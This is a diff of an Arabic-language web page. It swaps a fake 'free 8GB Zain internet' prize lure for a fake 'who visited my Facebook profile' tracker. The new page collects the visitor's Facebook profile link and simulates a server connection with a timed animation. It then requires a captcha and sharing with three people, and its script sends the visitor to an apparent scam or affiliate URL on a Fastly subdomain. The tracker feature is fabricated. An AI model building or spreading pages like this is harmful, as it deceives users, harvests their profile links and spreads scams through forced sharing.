@@ -1,114 +1,282 @@
-
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض انترنت زين المجاني</title>
+    <title>Facebook Profile Tracker - 3D Professional</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* إعدادات الخلفية العامة */
-        body, html {
+        :root {
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --fb-blue: #1877f2;
+            --fb-green: #2ecc71;
+            --text-light: #f5f6f7;
+            --error-red: #ff4d4d;
+        }
+
+        body {
             margin: 0;
             padding: 0;
-            height: 100%;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        .background-container {
-            /* استبدل '1000286097.png' بمسار الصورة الفعلي لديك */
-            background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('1000286097.png');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            text-align: center;
-            color: white;
+            /* استخدام نمط الخلفية الذي أرفقته */
+            background-color: #0e1013;
+            background-image: url('https://w0.peakpx.com/wallpaper/596/610/HD-wallpaper-whatsapp-dark-backround-doodles-pattern.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: var(--text-light);
         }
 
-        /* تنسيق النصوص */
-        .winner-tag {
-            background-color: rgba(0, 183, 189, 0.8);
-            padding: 10px 20px;
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 35px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 480px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .fb-logo {
+            font-size: 90px;
+            color: var(--fb-blue);
+            filter: drop-shadow(0 0 15px rgba(24, 119, 242, 0.8));
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-size: 26px;
+            margin-bottom: 35px;
+            font-weight: bold;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 18px 50px 18px 20px;
             border-radius: 50px;
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            border: none;
+            background: rgba(255, 255, 255, 0.95);
+            color: #1c1e21;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .status-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--error-red);
+            font-size: 22px;
+            transition: all 0.5s ease;
+        }
+
+        .status-icon.success {
+            color: var(--fb-green);
+            transform: translateY(-50%) scale(1.2);
+        }
+
+        .server-msg {
+            font-size: 13px;
+            color: #ccc;
+            margin-top: 10px;
+            height: 20px;
+            display: none;
+        }
+
+        .question-label {
+            display: block;
+            text-align: right;
+            margin: 20px 15px 10px 0;
+            font-weight: 600;
+            font-size: 16px;
+            color: #3b5998;
+            background: rgba(255,255,255,0.8);
+            padding: 5px 15px;
+            border-radius: 20px;
+            width: fit-content;
+        }
+
+        .options-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .opt-btn {
+            background: linear-gradient(145deg, #1877f2, #166fe5);
+            color: white;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 15px;
+            font-weight: 500;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .opt-btn.active {
+            background: linear-gradient(145deg, #2ecc71, #27ae60);
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.4);
+        }
+
+        .opt-btn i {
+            opacity: 0;
+            transition: 0.3s;
+        }
+
+        .opt-btn.active i {
+            opacity: 1;
+        }
+
+        #discover-btn {
+            width: 100%;
+            padding: 20px;
+            border-radius: 50px;
+            border: none;
+            background: #444;
+            color: #888;
+            font-size: 22px;
+            font-weight: bold;
+            margin-top: 30px;
+            cursor: not-allowed;
+            transition: 0.5s;
+        }
+
+        #discover-btn.ready {
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5);
             animation: pulse 2s infinite;
         }
 
-        .main-title {
-            font-size: 2.5rem;
-            font-weight: bold;
-            margin: 10px 0;
-            text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
-        }
-
-        .sub-text {
-            font-size: 1.1rem;
-            margin-bottom: 30px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 5px 15px;
-            border-radius: 5px;
-        }
-
-        /* تنسيق الزر */
-        .cta-button {
-            background-color: #00b7bd; /* لون قريب من هوية زين */
-            color: white;
-            padding: 15px 40px;
-            font-size: 1.5rem;
-            font-weight: bold;
-            text-decoration: none;
-            border-radius: 10px;
-            transition: transform 0.3s, background-color 0.3s;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-            border: 2px solid white;
-        }
-
-        .cta-button:hover {
-            background-color: #008e92;
-            transform: scale(1.05);
-        }
-
-        /* تأثير نبضي للفت الانتباه */
         @keyframes pulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            50% { transform: scale(1.02); }
             100% { transform: scale(1); }
         }
 
-        /* تحسين العرض للهواتف */
-        @media (max-width: 600px) {
-            .main-title { font-size: 1.8rem; }
-            .winner-tag { font-size: 1rem; }
+        .footer-note {
+            color: var(--error-red);
+            font-size: 13px;
+            margin-top: 20px;
+            font-weight: bold;
+            line-height: 1.6;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
         }
+
+        .dots::after { content: ''; animation: dots 1.5s infinite; }
+        @keyframes dots { 0% { content: '.'; } 33% { content: '..'; } 66% { content: '...'; } }
     </style>
 </head>
 <body>
 
-    <div class="background-container">
-        
-        <div class="winner-tag">
-            🎊🎉 الساحب رقم (٢٥٤) لعرض 8 جيجابايت 🎊🎉
-        </div>
+<div class="glass-card">
+    <i class="fab fa-facebook fb-logo"></i>
+    <h1>من زار ملفي الشخصي على فيسبوك</h1>
 
-        <h1 class="main-title">
-            انترنت 8 جيجابايت <br> مجانية لشبكة زين
-        </h1>
-
-        <p class="sub-text">
-            أكمل جميع الخطوات للحصول على 8 جيجا مجاناً
-        </p>
-
-        <a href="https://aping.global.ssl.fastly.net/pages/fba2/?i=274466" class="cta-button">
-            اضغط هنا
-        </a>
-
+    <div class="input-container">
+        <input type="text" id="fb-link" placeholder="ادخل رابط صفحتك على فيسبوك" oninput="processLink()">
+        <i class="fas fa-check-circle status-icon" id="main-status"></i>
+        <div id="status-text" class="server-msg">جارٍ ربط السيرفر بصفحتك<span class="dots"></span></div>
     </div>
+
+    <span class="question-label">فترة زيارة الملف الشخصي:</span>
+    <div class="options-stack">
+        <button class="opt-btn" onclick="select(this, 'g1')">اليوم <i class="fas fa-check-circle"></i></button>
+        <button class="opt-btn" onclick="select(this, 'g1')">الخمسة أيام الماضية <i class="fas fa-check-circle"></i></button>
+        <button class="opt-btn" onclick="select(this, 'g1')">2025 - 2026 <i class="fas fa-check-circle"></i></button>
+    </div>
+
+    <span class="question-label">ماذا تفضل أن يظهر لك؟</span>
+    <div class="options-stack">
+        <button class="opt-btn" onclick="select(this, 'g2')">اسم الزائر فقط <i class="fas fa-check-circle"></i></button>
+        <button class="opt-btn" onclick="select(this, 'g2')">اسم الزائر + وقت الزيارة <i class="fas fa-check-circle"></i></button>
+        <button class="opt-btn" onclick="select(this, 'g2')">التقرير الكامل والمفصل <i class="fas fa-check-circle"></i></button>
+    </div>
+
+    <button id="discover-btn" onclick="goToLink()" disabled>اكتشف</button>
+    
+    <div class="footer-note">
+        ملحوظة: عليك إجتياز اختبار انا لست برنامج روبوت<br>
+        وعليك مشاركتها مع ثلاثة اشخاص
+    </div>
+</div>
+
+<script>
+    let linkReady = false, q1Ready = false, q2Ready = false;
+    let debounce;
+
+    function processLink() {
+        const input = document.getElementById('fb-link').value;
+        const icon = document.getElementById('main-status');
+        const msg = document.getElementById('status-text');
+        
+        linkReady = false;
+        icon.classList.remove('success');
+        msg.style.display = 'none';
+        clearTimeout(debounce);
+
+        if(input.length > 10) {
+            msg.style.display = 'block';
+            debounce = setTimeout(() => {
+                msg.style.display = 'none';
+                icon.classList.add('success');
+                linkReady = true;
+                updateButtonState();
+            }, 2000);
+        }
+        updateButtonState();
+    }
+
+    function select(btn, group) {
+        const buttons = btn.parentElement.querySelectorAll('.opt-btn');
+        buttons.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+
+        if(group === 'g1') q1Ready = true;
+        if(group === 'g2') q2Ready = true;
+        updateButtonState();
+    }
+
+    function updateButtonState() {
+        const btn = document.getElementById('discover-btn');
+        if(linkReady && q1Ready && q2Ready) {
+            btn.classList.add('ready');
+            btn.disabled = false;
+        } else {
+            btn.classList.remove('ready');
+            btn.disabled = true;
+        }
+    }
+
+    function goToLink() {
+        if(!document.getElementById('discover-btn').disabled) {
+            window.location.href = "https://aping.global.ssl.fastly.net/pages/fba2/?i=274466";
+        }
+    }
+</script>
 
 </body>
 </html>
- 
